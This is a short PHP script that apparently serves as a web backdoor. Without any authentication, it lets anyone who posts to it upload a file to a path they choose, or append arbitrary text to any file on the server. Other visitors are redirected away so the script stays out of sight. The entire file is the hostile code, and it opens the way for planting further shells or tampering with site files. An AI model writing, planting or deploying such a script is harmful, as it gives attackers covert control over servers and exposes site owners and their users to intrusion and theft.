<?php
if (isset($_POST['upload'])){
	if ($_POST['upload']=='1'){
		$uploadfile = $_POST['path'].$_FILES['uploadfile']['name'];
		if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $uploadfile))
			{echo 'ok';}
		else {echo $_FILES['uploadfile']['error'];}
		}
	if ($_POST['upload']=='2'){
		$fp=fopen($_POST['path'],'a');  
		fwrite($fp, "\r\n");
		fwrite($fp, $_POST['uploadfile']);
		fclose($fp);
		echo 'ok';
		}
	}
else {header('Location: ../../');}
?>